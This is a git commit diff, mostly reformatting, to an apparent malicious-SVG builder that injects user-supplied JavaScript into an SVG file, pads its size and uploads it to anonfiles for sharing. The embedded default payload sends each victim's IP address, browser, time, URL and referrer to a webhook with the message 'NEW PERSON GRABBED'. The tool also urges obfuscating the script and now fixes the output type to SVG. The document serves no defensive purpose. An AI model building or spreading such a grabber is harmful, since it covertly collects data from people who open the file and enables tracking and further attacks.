36f34ef082c64c486db2e65afc6c4b8116cf0476
K.Dot <110929758+KDot227@users.noreply.github.com>
2023-02-21 16:03:46 -0600

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
 import time
 import os
 import re
+
 try:
     import requests
 except ImportError:
@@ -58,13 +59,14 @@ function send_webhook() {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by K.Dot]\n\`\`\``
+            content: `@everyone NEW PERSON GRABBED!!!\nIP: ${get_ip()}\nBrowser: ${get_browser()}\nTime: ${get_time()}\nURL: ${get_url()}\nReferrer: ${get_referrer()}\nMade by K.Dot`
         })
     });
 }
 
 send_webhook();
 """
+
 
 class main:
     def __init__(self) -> None:
@@ -76,8 +78,10 @@ class main:
         else:
             self.js_code = input("What is the path of the js payload? -> ")
         self.name = input("What do you want to name the file? (without extension) -> ")
-        self.filetype = input("What file type do you want to save it as? (Example = zip, txt, exe, etc.) -> ")
-        self.download_link_type = input("Would you also like the direct download link? (y/n) -> ")
+        self.filetype = "svg"
+        self.download_link_type = input(
+            "Would you also like the direct download link? (y/n) -> "
+        )
         pump = input("Would you like to pump the file for more size? (y/n) -> ")
         if pump.lower() == "y":
             self.pump = input("How many MB would you like to pump the file? -> ")
@@ -85,24 +89,27 @@ class main:
             self.pump = False
         self.main()
         input("Press enter to exit")
-        
+
     def get_direct_download_link(self, url):
         r = requests.get(url)
         text = r.text
-        regex = r'https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[0-9]+/[^"]+'
+        regex = (
+            r'https://cdn-[0-9]+\.anonfiles\.com/[A-Za-z0-9]+/[A-Za-z0-9]+-[0-9]+/[^"]+'
+        )
         match = re.findall(regex, text)
         return match[0]
 
-
     def main(self):
-        print("Please remember to Obfuscate your JavaScript code before using this tool.")
+        print(
+            "Please remember to Obfuscate your JavaScript code before using this tool."
+        )
         try:
             js_code = self.js_code2
         except AttributeError:
             try:
                 with open(self.js_code, "r") as f:
                     js_code = f.read()
-                    js_code = '\t\t'.join(js_code.splitlines())
+                    js_code = "\t\t".join(js_code.splitlines())
             except FileNotFoundError:
                 print("File not found")
                 time.sleep(3)
@@ -112,7 +119,10 @@ class main:
         svg = SVG.replace("%code%", js_code) + extra_chars
         svg_bytes = svg.encode("utf-8")
         try:
-            r = requests.post("https://api.anonfiles.com/upload", files={"file": (f"{self.name}.{self.filetype}", svg_bytes)})
+            r = requests.post(
+                "https://api.anonfiles.com/upload",
+                files={"file": (f"{self.name}.{self.filetype}", svg_bytes)},
+            )
         except Exception as e:
             print(f"[-] {e}")
             time.sleep(3)
@@ -120,10 +130,12 @@ class main:
         url = r.json()["data"]["file"]["url"]["short"]
         if self.download_link_type.lower() == "y":
             download_link = self.get_direct_download_link(url)
-            print(f"Download link (short): {url} | Download link (direct): {download_link}")
+            print(
+                f"Download link (short): {url} | Download link (direct): {download_link}"
+            )
         else:
             print(f"Download link: {url}")
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
